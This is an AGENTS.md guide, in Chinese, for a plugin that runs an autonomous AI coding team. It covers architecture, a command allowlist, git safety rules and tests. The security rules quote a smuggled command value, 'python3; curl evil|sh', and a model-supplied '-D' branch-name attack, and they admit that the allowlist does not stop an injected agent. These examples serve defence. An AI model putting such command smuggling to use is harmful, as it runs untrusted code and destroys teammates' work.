# AGENTS.md

面向 AI 编码代理的仓库指南。dsh-ai-team 是 DeepSeek Harness（dsh）的插件：喂给它一台裸机、一组以环境变量引用的密钥和一个 git 远端，插件驱动的 AI 团队（leader / developer / reviewer / operator）自主跑完「引导 → 拆任务 → 并行开发 → 质量门 → 审查 → 合并 → 部署 → 迭代」，人只在升级（escalation）时介入。

> 本文件**不是** human-only 区，AI 代理可以直接修改（2026-08-29 变更）。默认 `security.forbiddenPaths` 只剩 `LICENSE`，插件驱动的 AI 团队可以改仓库内任意文件、可以 commit、也可以 push 任务分支。唯一保留的操作约定：改本文件请单独成一次 docs-only 变更，别混进代码任务的 diff —— 不是因为你没权限，而是因为文档改写没有任何客观质量门能验证它。

## 命令速查

| 目的 | 命令 |
| --- | --- |
| 安装依赖 | `pnpm install` |
| 类型检查 | `pnpm typecheck`（`tsc` 两份配置 `--noEmit`，strict，必须 0 error） |
| 静态检查 | `pnpm lint`（oxlint，必须 0 warning） |
| 测试 | `pnpm test`（vitest，真实 git 仓库） |
| 构建 | `pnpm build`（`tsc` × 2 → `tsdown` → `lib/{index.js,client.js}`） |
| 本地跑插件 | `pnpm dsh web --patch ./cordis.patch.yml` |
| 发布前校验 | `pnpm pack --dry-run`（`prepublishOnly` 已串起 typecheck+lint+test+build） |

环境：Node `>=22.19`、pnpm 11.x。单测跑单个文件用 `pnpm exec vitest run tests/test-unattended.ts`。

## 目录地图

```
README.md           人类入口：功能、快速开始、Config 字段语义（配置的唯一真相源）
AGENTS.md           本文件：AI 代理仓库指南（架构铁律、开发纪律、连带改动表、已知坑）
PILOT.md            操作者 runbook：首次真实环境无人值守怎么跑、看什么、出事怎么办
docs/               其余文档一律在此，见「文档规范」
  design-interaction.md  「需求采集 → 文档先行 → 并行开发 → 重规划」交互流程规格（M0–M3 已实施）
  refactor-p1-service-split.md  service.ts / tools.ts 拆分进展纪要：可容器化域 vs 应留驻的高耦合编排（P1，生效中）
src/
  index.ts        插件入口：四导出 name/inject/Config/apply，ctx.provide('autopilot')
  service.ts      AutopilotService —— 状态机宿主与全部编排（纯逻辑请落到 service/，别塞这里）
  exec.ts         共享 shell runner：gates / bootstrap / deploy 的 runShell 唯一实现
  service/
    options.ts    AutopilotOptions：Config 校验映射之后的运行时形状
    state.ts      内部记录（= state.json 的形状）+ shortId/clip/noteLines 等共享纯函数
    description.ts 任务描述组装：注入顺序与「所有权 > 教训 > 正文」的预算倒排
    contracts.ts  contract_create 的写前校验与渲染（id / 悬空依赖 / 成环 / 禁区 / 域数），纯函数不碰盘
    report.ts     完成报告渲染（落在 <stateDir>/completion.md）
    views.ts      视图投影的纯映射（member/task/review Record → View），可脱离状态机单测
    daemon.ts     守护循环的纯判定层（返工打满 / 空闲卡死 / 墙钟超限），升级副作用留在 service.ts
    docflow.ts    文档审批链与问卷记录纯操作（draft 区读写 / sha256 钉与比对 / 升格 / 答案回写）；交互层（ask_human 等待唤醒、投递）留在 service.ts
  tools.ts        模型可见工具（defineTool 注册），每次变更 publish 一次快照
  vocab.ts        运行时枚举词表（ROLES / TASK_STATUSES / ESCALATION_REASONS …）+ `TICKET_ROUTE_PREFIX`（服务端路由与面板 fetch 唯一共用的事实）：零依赖、浏览器安全
  schema.ts       zod 形状真相 + `z.infer` 派生视图类型：视图与投影校验的唯一来源，只依赖 zod 与 vocab
  view.ts         类型门面：`export * from './vocab.js'` + 纯类型 re-export（禁 node、禁值引用 schema）
  events.ts       session 事件与投影的类型声明合并（唯一词汇表）
  projection.ts   `autopilot` 投影单元的注册（schema 已移到 schema.ts；stateVersion: 9）
  git.ts          git CLI 薄封装：远端 clone/push、push 安全规则、ref 名校验（assertSafeRef）
  team.ts         .tasks/*.md 契约解析 / 回写 / _board.md 生成、touches 重叠判断
  gates.ts        质量门执行器 + 命令白名单（CommandNotAllowedError）
  bootstrap.ts    裸机引导：探测工具链 → rootless 安装 → setup → verify
  deploy.ts       部署 + 健康检查（指数退避）+ 自动回滚
  escalate.ts     升级记录：打标、写任务单留言、发 webhook
  questionnaire.ts 问卷实体（与 escalate 平级、绝不合并）：题目校验 / 答案归一 / 状态推进 / 画成工单字段
  docdraft.ts     文档先行：draft 区读写与 frontmatter、章节定位回写、sha256 钉与升格、禁区比对
  ticket-handler.ts 工单 HTTP 层的唯一实现（node 侧，不进客户端产物）：前缀剥离 + id 锚死的路由、信任围栏、定长 token 比对、表单渲染与两种提交形态
  formmodel.ts    题面 → 表单控件的纯映射（浏览器安全，禁 zod / `node:`）：服务端工单页与面板内联卡片共用同一份题面
  notification.ts Mailer（自研 SMTP，仅用 node:net/tls）+ TicketServer（独立端口那层壳，只 start/close，逻辑在 ticket-handler）
  secrets.ts      密钥唯一出口：env 引用解析 + SecretRedactor 脱敏
  learnings.ts    知识回路纯逻辑：捕获去重 / 有界注入 / learnings.md 渲染（落 stateDir，真相源在 state.json）
  roles.ts        四角色的 system prompt 模板
  preset.ts       `autopilot-team` agent 预设的落盘（ensureAutopilotTeamPreset，缺失才拷贝、绝不覆盖、失败静默）
  profile.ts      项目画像适配器：按不同协作约定（AgentDeploy 等）覆盖默认分支/PR 策略/合并方式/质量门
  cache.ts        构建缓存共享：把 .nuxt/.output 等产物按分支符号链接复用（可选、尽力而为）
  github.ts       GitHub REST 适配层：为任务分支 upsert PR、查询 commit 的 CI 状态
  client/         Web 端：面板、设置卡片、i18n 字典、样式、宿主契约（React 18，CJS 产物）
preset/
  autopilot-team/ 插件自带的 agent preset 模板（agent.cordis.yml + preset.yml），随包发布，运行时拷到用户级预设根
tests/            helpers.ts（真 git fixture）+ integration / unattended / notification / profile / bootstrap / cache / learnings / exec / allowlist / service-modules / client-dict / questionnaire / ticket-http / cycles 十四个常规测试 + test-e2e-*.ts 十一个确定性闭环（md2html / parallel / askhuman / clarify / docflow / escalation / escalations / gfm / replan / replans / multiteam，驱动：packages/llm-mock）+ smoke-cordis 冒烟（含预设落盘断言）
```

## 运行时拓扑

```
<rootDir>/<teamId>/repo                共享仓库（集成检出，始终在 baseBranch）
<rootDir>/<teamId>/workspaces/<memberId>  每个成员一个 git worktree，共享 object store
<stateDir>/state.json                  全量状态（防抖落盘，dispose 时 flush）
<stateDir>/heartbeat.json              每 tick 写入，供崩溃恢复
<stateDir>/learnings.md                台账便利视图（运行态，不入库）
<stateDir>/completion.md               完成报告（运行态，不入库）
<stateDir>/state.json.corrupt-<ts>     解析失败时改名留存，不让空状态覆盖掉唯一一份历史
<repo>/.tasks/<id>.md                  任务真相源（frontmatter + Gherkin 验收）
<repo>/.tasks/_board.md                自动生成，勿手改；内容稳定（不含时间戳，否则每拍都弄脏 worktree）
```

`.dsh-ai-team/` 与 `**/state.json`、`**/heartbeat.json` 已在 `.gitignore` 中，运行态绝不入库。

## 架构铁律

1. **核心与 cordis 解耦**：`AutopilotService` 不 import `ctx`/session，可独立实例化跑测试。插件层只做四件事——命名导出、提供服务、注册工具、`ctx.effect` 清理。
2. **只用命名导出**：`index.ts` 不能加 `export default`，否则 Loader 的默认解包会丢掉 `Config` schema。
3. **投影是全量快照 + last-write-wins**：每个 `autopilot/update` 事件携带完整的 `AutopilotProjection`，折叠函数直接替换，不做增量合并。
4. **状态与事件分离**：service 负责状态，tools.ts 负责把变更翻译成 session 事件。不要反向依赖。
5. **`view.ts` 是浏览器安全的**：客户端产物会内联它。两个方向都要守 ——
   - 不得 import node 内置模块（会炸客户端构建）；
   - 对 `schema.ts` 只能 `export type { ... } from`。写成**值**导入不会有任何编译错误，但整个 zod 会被静默打进前端产物。
   `tests/smoke-cordis.ts` 的「keeps the client bundle browser-safe」直接断言 `lib/client.js` 里没有 zod / `node:` require，并正面断言词表确实在产物里 —— 所以这条不是纸面规则（改动 view.ts 后记得先 `pnpm build` 再跑它）。

## 安全硬规则（不可绕过）

1. **密钥只引用不落盘**：Config 只存环境变量名（`xxxEnv`），运行时 `process.env[name]` 读取。任何面向模型/日志/webhook 的输出必须过 `SecretRedactor`（脱敏为 `***`）。
2. **命令白名单**：gates / bootstrap / deploy 的每个 shell 片段首 token 必须命中 `security.commandAllowlist`，否则抛 `CommandNotAllowedError` 并引导走升级。判据是**「凡能悄悄启动一个白名单没见过的进程的构造，要么独立成段受检、要么整条拒绝」**：
   - 分隔符拆全 —— `&& || ; | &` 与**换行**（`splitSegments`）；
   - 命令替换 `$( )` 与反引号**整条拒绝**（`hasHiddenExecutable`），不做拆分放行的假象；
   - 重定向与 glob（`>`、`*`）**继续放行**：它们由同一个 shell 处理、不启动新进程，拦下来只打断正常配置而无安全收益。
   - `bootstrap.systemPackages` 会被拼进 `packageManagerCommand` 之后交给 shell，所以**每个包名都要过 `PACKAGE_NAME_RE`** —— 少了这步，`['python3; curl evil|sh']` 就让 pm 的白名单校验形同虚设（实测确认过它真的会执行）。
   - ⚠️ 仍然成立的事实：清单里有 `sh` / `node` / `ssh` / `docker` 时，白名单就等价于没开（`node -e` 即任意执行）。这道定位是**防人误配 + 留审计痕迹**，不是防一个已被注入的模型。
3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价与应对见 README「安全模型」3：需要硬保证的项目自己把它配回 `security.forbiddenPaths`。
4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态仅 github 平台查得到（其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制），非 github 仓库请显式关掉 `requireCiGreen`。
5. **禁止破坏性 git**：不 force-push 共享分支（任务/成员分支仅限 `--force-with-lease`）、不 reset 共享分支、不删 base 分支。所有可变 git 操作（create / checkout / merge / delete / push）的分支名一律过 `assertSafeRef`：不得以 `-` 开头、不得含空格或 `..`，否则模型传一个 `-D` 就能把 `git branch -D <同事的任务分支>` 拼进 argv 静默删分支。
6. **工单凭据只活在人手里**：token 存在 service 侧旁路表（`state.json.ticketTokens`，**内部记录字段**，不是视图字段 —— 所以 `stateVersion` 不动），只拼进邮件 / webhook 的文案。任何人往 `EscalationView` / `QuestionnaireView` / 投影上加 token 字段都是在把「谁能答这张工单」写进谁都能抄一份的地方，`tests/test-notification.ts` 会红。三个失败分支（未知 id / 缺凭据 / 围栏不过）**必须返回逐字节相同的 404**，绝不 403 —— 差别一旦不同，工单号就能被枚举。独立端口 `host` 非回环 → 启动即抛，不降级继续。⚠️ 诚实边界：同源信任围栏挡的是端口扫描、跨站表单和 DNS rebinding，**挡不住本机进程和已被注入的 agent**（与硬规则 2 同一定位）。

## 开发纪律

四条行为准则，管「怎么改代码」这件事本身，与「架构铁律」（架构红线）、「安全硬规则」（安全红线）互补。总原则：**判断力优先于流程**——琐碎改动不必全套走，拿不准就按条文来。

1. **先想后写，不替人做决定**：不假设、不藏困惑、显式摆出权衡。动手前把关键假设说清楚；需求有多种解读时列出来让人选，不默默挑一种；有更简单的方案就直说，该反驳就反驳；真不清楚就停下来问——结对时问人，无人值守时该升级就升级，不带困惑硬写。
2. **简单优先**：只写解决问题所需的最少代码，不做任何投机性设计——没人要求的功能不加、单一用途不造抽象、没人要的「灵活性 / 可配置项」不加、不可能发生的场景不写错误处理（「安全硬规则」要求的防御性检查不受此限）。自检一句：资深工程师看到会不会说过度设计？会，就删。
3. **外科手术式改动**：diff 里每一行都要能追溯到本次需求。不顺手「优化」旁边的代码、注释与格式；没坏的不重构；风格向周边代码看齐，哪怕你有更好的写法；发现无关的死代码，提出来，不擅自删。唯一的「顺手」义务是自己改动造成的孤儿（不再被引用的 import / 变量 / 函数）必须清掉。「改一处要连带改哪儿」表列出的是**必须**扩大的改动范围，表之外的不扩。
4. **目标驱动，验证过了才算完**：动手前先把任务翻译成可验证的成功标准——「加校验」变成「先写非法输入的测试，再让它变绿」，「修 bug」变成「先写复现测试，再让它变绿」，「重构」就是「前后测试都绿」（走 `.tasks` 契约的任务，Gherkin 验收就是现成的成功标准）。多步任务先列「步骤 → 验证手段」清单，按步推进；宣告完成前跑完「代码风格」末尾的四件套（顺序要求见「测试约定」）。

这些纪律生效的信号：diff 更小、因过度设计造成的返工更少、澄清发生在动手之前而不是搞砸之后。

## 代码风格

- TypeScript strict + `noUncheckedIndexedAccess` + `verbatimModuleSyntax`：类型导入必须写 `import type`，相对导入必须带 `.js` 扩展名。
- 标识符用英文；**源码注释尽量用中文**（读懂代码比省几个字符更重要）；用户可见文案走 client 的 zh/en 字典。
- 加 i18n key 时 **zh 与 en 必须同时加**（`en: Record<keyof typeof zh, string>` 会强制你补齐）。
- 提交信息用 Conventional Commits（`feat:` / `fix:` / `docs:` / `refactor:`，正文中文，见 `git log`）。
- 宣告完成前按 `pnpm typecheck && pnpm lint && pnpm build && pnpm test` 的顺序跑（build 必须在 test 前，原因见「测试约定」）。

## 文档规范

仓库根只留三份 `.md`：`README.md`（人类入口 + **配置字段语义的真相源**）、`AGENTS.md`（本文件 —— 工具按固定路径名找它，所以它必须在根）、`PILOT.md`（操作者 runbook）。**其余文档一律放 `docs/`，新文档也直接写在 `docs/` 下**，别先在根落脚再搬家。

- **命名**：`docs/` 下用小写 kebab-case（`docs/design-interaction.md`）；SCREAMING-CASE 只属于根目录那三份历史入口。一篇只讲一个主题，同类攒到 3 篇以上再开子目录（如 `docs/adr/0001-<slug>.md`），不要三层嵌套。
- **每篇开头**：H1 一句话说明这是什么，紧接一段 `>` 引用交代**状态**（提案 / 已实施 / 生效中）和**分工**（"配置语义以 README 为准、操作以 PILOT 为准"）。引用代码时优先写**符号名**（函数 / 类 / 常量，如 `splitSegments`），不要引裸行号——行号会漂移，版本号也锚不住单文件内的改动。
- **一处事实一处写**：配置字段 → README「配置」；架构与连带关系 → AGENTS.md；交互流程规格 → `docs/design-interaction.md`；怎么跑 → PILOT.md。别处要提就**链过去**，抄一份必然漂移。
- **相对链接**：文档之间一律用 markdown 相对链接，从 `docs/` 指回根写 `../README.md`；`.tasks/*.md` 引设计文档写 `../docs/<name>.md`。
- **不归本规范管**：`.tasks/*.md`（任务契约，目录写死在 `src/team.ts`，插件按它解析）、`<stateDir>/learnings.md` 与 `<stateDir>/completion.md`（运行态生成物，不入库）。别为了整齐把它们搬进 `docs/`。
- **搬家算一次 docs-only 变更**（理由见文件开头：文档改写没有客观门可验证），且必须把旧文件名在全仓库改干净：`grep -rn '<旧文件名>' --exclude-dir={node_modules,.dsh-ai-team} .`。⚠️ `.dsh-ai-team/` 下是各成员 worktree 的仓库副本，改那里等于污染别人的分支。`.workbuddy/memory/*` 是历史会话记录，**不追溯改写**。
- **`docs/` 不在 `package.json` 的 `files` 白名单里**，不随 npm 包发布：面向使用者的说明必须写进 `README.md`，`docs/` 只服务读源码的人。

## 状态机

- 任务：`pending → in_progress → in_review → done`，`changes_requested` 打回，升级置 `needs-human`（人工处理后可回 `pending`）；重规划废弃置 `cancelled`（契约文件保留不删，语义见 README「需求变更与重规划」）。
- 团队阶段：`intake → kickoff_pending_approval → scaffolding → developing ⇄ replanning`。前三个阶段一律不派发（`dispatch` 门），只有 `developing` / `replanning` 会。`intake → kickoff_pending_approval` 由服务端推（需求问卷答完，或 `ask_human(kind: approval)` 把一份非空开工包标成待批），组长不能自己 `autopilot_phase` 越过去；`createTeam` 落在 `developing`（老 state.json 缺 `phase` 也兜底它）。
- 问卷：`open → answered / expired / cancelled`。它与升级是两件事：一张 open 问卷让任务在面板上标「等人回答」，但**不**置 `needs-human`、不进升级直方图、不产生学习记录，并让 `checkStuck` 豁免这张任务（`checkBudget` 不豁免，所以永远没人答的单最终以 `budget-exceeded` 升级）。
- 循环：`stopped / running / paused / escalated / completed`。崩溃恢复时持久化的 `running` 一律降为 `paused`，等 `autopilot_resume`。
- 升级触发条件（命中即 escalate，禁止自行绕过）：**不在本文件抄清单**——语义口径以 README「无人值守主循环」末尾的清单为准，枚举真相源是 `src/vocab.ts` 的 `ESCALATION_REASONS`（新增分类走「改一处要连带改哪儿」表，两处各抄一份必然漂移过）。

## 改一处要连带改哪儿

| 你改了 | 必须同步 |
| --- | --- |
| 视图**形状**（字段增删） | 只改 `schema.ts` —— 视图类型由 `z.infer` 派生，不必手写第二份；连带：`stateVersion` +1、`client/AutopilotPanel.tsx` 渲染、需要文案则加字典 |
| 枚举**取值**（状态、原因、kind…） | 只改 `vocab.ts` 的那个 `as const` 数组 —— zod enum、`tools.ts` 参数、面板渲染都读它；面向人的加字典 |
| 新增 tool | `tools.ts` 内 `publish(service, exec)`；README「工具一览」 |
| 新增 role | `vocab.ts` 的 `ROLES` → `roles.ts` prompt → 字典 `role.*` |
| 新增 `EscalationReason` | `vocab.ts` 的 `ESCALATION_REASONS` → 字典 `reason.*`；⚠️ 先确认服务端真会产出它，无人产出的分类只会给模型多一个错选项 |
| 新增 Config 字段 | `index.ts` 的 `Config` 接口与 schema → `service/options.ts` 的 `AutopilotOptions` → `apply()` 的映射 → README 配置块 → 需要时 `client/settings-card.tsx` |
| 改 `profile.ts` 的约定 | 服务端默认值可能与 `ProjectProfile` 分叉，改前先核对 `README` 的 AgentDeploy 说明 |
| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES` 与 `REMOTE_PLATFORMS`；⚠️ 类型三处（index.ts 接口 / options.ts）已由 `RemotePlatform` 单源，但 zod 侧的 `z.const` 字面量列表因 schemastery 无 enum 组合器仍需手动同步；且非 github 无 CI 查询实现 |
| 改工单路由 / 题面与答案形状 | 前缀常量只有 `vocab.ts` 的 `TICKET_ROUTE_PREFIX` 一份（服务端与面板各自 import，写死两份必漂移）→ `ticket-handler.ts` 的前缀剥离与锚死正则 → 面板与服务端表单共用 `src/formmodel.ts`（改控件形态两边一起变）→ 面向人的文案 zh/en **同时**加 |
| 移动 / 重命名 `.md` 文档 | 全仓库 grep 旧文件名并逐处改引用（README、`.tasks/*.md` 契约、`src/` 注释、`*.patch.yml`）；放哪儿、怎么命名见「文档规范」 |

## 已知坑

1. **bootstrap 默认不跑任何 setup/verify 命令**（2026-08-30 变更，原「本地起 dsh 引导失败」已修）：`DEFAULT_BOOTSTRAP` 的 `setupCommand` / `verifyCommand` 默认空串 = 跳过，引导只做工具链探测 + rootless 安装。原因：空 `remote.url` 时团队仓库是空仓库，任何 pnpm 脚本必失败；真实用户仓库也没有普适脚本名。要跑初始化/自检的人**自己**在配置里指认目标仓库真实存在的命令（README「配置」、PILOT.md dogfood 模板有示例；`tests/smoke-cordis.ts` 钉住默认值，改回具体命令会红）。
2. **tsdown 的 `clean: false` 是故意的**：`lib/types`（tsc 产物）与 `lib`（打包产物）同目录，打开 clean 会把 d.ts 一起抹掉。
3. **client 产物的 banner/footer 不能动**：`tsdown.config.ts` 用 `window.__ModuleLoader__.load(...)` 包裹 CJS 输出，改了 Loader 就加载不了插件。
4. **测试用真实 git，不 mock**：`tests/helpers.ts` 用本地 bare 仓库扮演 remote。vitest 配了 `fileParallelism: false` + `pool: 'forks'`，别图快改成并行，会互相踩 worktree。
5. **设置卡片改动需重启**：`autopilot` 命名空间在插件加载时注册，设置页改配置要带 `--patch` 重启服务端才生效。
6. **`autopilot-team` 预设**：落盘机制见 README「Agent 预设」。坑只有一条——自动建 `demo` 团队的钩子在宿主 `lib/index.js`，改宿主代码后需重启服务端。
7. **面板的工单路由是「可选注入」，不是顶层 `inject`**：`src/index.ts` 用 `ctx.inject(['webServer', 'webRuntime'], …)` 注册 prefix 路由。两个原因：顶层 `export const inject = ['tools']` 被 `tests/smoke-cordis.ts` 钉死；而顶层 inject 是**硬依赖**，无宿主 web 的 headless profile 会直接起不来。所以宿主不在 = 只是没有这条路由（独立端口照旧）。挂载外面包了一层 `logger.warn` —— 宿主 `register` 对重复 `(kind, path)` 会抛（HMR / 双装载场景），挂不上不该拖垮整个插件。

## 测试约定

- `tests/test-integration.ts` 全流程生命周期（clone → 派发 → 门 → 审查 → 合并 → push → 部署）。
- `tests/test-unattended.ts` 循环分支（崩溃恢复、依赖/域锁、卡死、返工上限、完成报告、重规划）+ 安全硬规则。
- `tests/test-notification.ts` 真 mock SMTP（net）+ 真工单端口，验证通知闭环。⚠️ 其中一条顺带是**凭据不漏进视图**的守门人：投影里的 `ticketUrl` 必须无 `?t=`，token 只活在 `state.json` 的旁路表 `ticketTokens` 里。
- `tests/test-profile.ts` / `test-bootstrap.ts` / `test-cache.ts` / `test-learnings.ts` 各适配层与纯逻辑模块。
- `tests/test-exec.ts` **shell runner 的行为锁定**：超时折算成 exitCode 1、只有 abort 才 reject、`CI=true`、日志尾保留最后 4000 字符。改 `exec.ts` 时这组必须一条不改地通过，才是「纯搬家没改行为」。
- `tests/test-allowlist.ts` **白名单判定语义**：命令替换 / 反引号 / 换行 / 裸 `&` 一律不给静默放行（含一条"标记文件没被创建"的证据断言，证明确实没 spawn），而重定向与 glob 仍放行 —— 判据见「安全硬规则 2」。
- `tests/test-service-modules.ts` `service/` 下纯函数的直接单测（描述预算倒排、完成报告渲染、state 工具）。
- `tests/test-cycles.ts` 多周期开发闭环（CYC-1..7）：周期实体 / 增量规划与派发收窄 / 验收门与自动推进 / checkpoint 边界问卷 / 老团队兼容。
- `tests/test-questionnaire.ts` 问卷闭环：独立实体（不产生升级/教训/直方图）、工单表单渲染与 400 重述、interactive 真 await 与超时兜底、答案 `[decision]` 回写、draft→accepted 审批链（含防「批 A 合 B」）、`contract_create` 写前校验。
- `tests/test-ticket-http.ts` **工单 HTTP 契约的行为锁定**：前缀剥离（挂 `/autopilot/ticket` 却请求 `/ticket/x` → 404）、未知 id / 缺 token / token 不符**响应体逐字节相同**、DNS rebinding（`Host: evil.com` + 相同 `Origin` → 404）、`sec-fetch-site: cross-site` 拒、`0.0.0.0` 绑定拒启、JSON 400 保留 `missing`、超 body 413。⚠️ 它必须用裸 `node:http` 客户端而不是 `fetch` —— `fetch` 不给设 `Host`，而 `Host` 正是围栏的第一判据。
- `tests/smoke-cordis.ts` Loader 契约冒烟。⚠️ 它把**注册工具名清单整条锁死**，新增 tool 必须同步那份数组，否则 `pnpm test` 红在这一条上。
- `tests/test-e2e-*.ts` 确定性 e2e 系列（离线、零 token、可重复复跑）：md2html / parallel / askhuman / clarify / docflow / escalation / escalations / gfm / replan / replans / multiteam 各锁一段真实闭环；由独立子项目 `packages/llm-mock`（OpenAI 兼容流式 mock）驱动。
- 新增断言优先用 `AutopilotOptions` 工厂 `testOptions(fixture, overrides)`，别手搓配置对象。
- ⚠️ 校验顺序必须是 `typecheck && lint && build && test`：`smoke-cordis` 跑的是 `lib/` 产物，把 build 放在 test 之后会拿上一版 lib 测出**假失败**（本轮实测踩过）。

## 发布

`npm publish` 前 `prepublishOnly` 会自动跑 typecheck + lint + **build** + test（顺序要求见「测试约定」），全绿才发包。`files` 含 `lib/`、`preset/`、`README.md`、`LICENSE`、`cordis.patch.yml`。改版本号后先 `pnpm pack --dry-run` 核对清单。
